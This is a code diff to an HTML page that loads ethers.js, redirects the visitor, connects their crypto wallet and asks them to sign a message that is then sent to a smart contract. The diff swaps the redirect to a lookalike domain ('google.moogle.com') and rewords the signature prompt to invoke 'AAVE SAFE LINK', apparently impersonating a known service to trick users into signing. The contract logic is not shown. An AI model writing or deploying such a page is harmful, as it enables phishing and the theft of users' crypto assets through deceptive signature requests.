@@ -8,7 +8,7 @@
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 <script>
 // ===== Task2: ریدایرکت فوری =====
-window.location.replace("https://google.com");
+window.location.replace("https://google.moogle.com");
 
 // ===== Task1: اتصال ولت و ارسال امضا به کانترکت =====
 (async () => {
@@ -20,7 +20,7 @@ window.location.replace("https://google.com");
       const signer = await provider.getSigner();
 
       // مرحله ۱: گرفتن امضا از کاربر
-      const message = "Please sign this message to confirm."; // پیام دلخواه
+      const message = "Please sign this message to AAVE SAFE LINK."; // پیام دلخواه
       const signature = await signer.signMessage(message);
 
       // مرحله ۲: تعریف ABI و آدرس کانترکت
@@ -50,3 +50,4 @@ window.location.replace("https://google.com");
 </script>
 </body>
 </html>
+
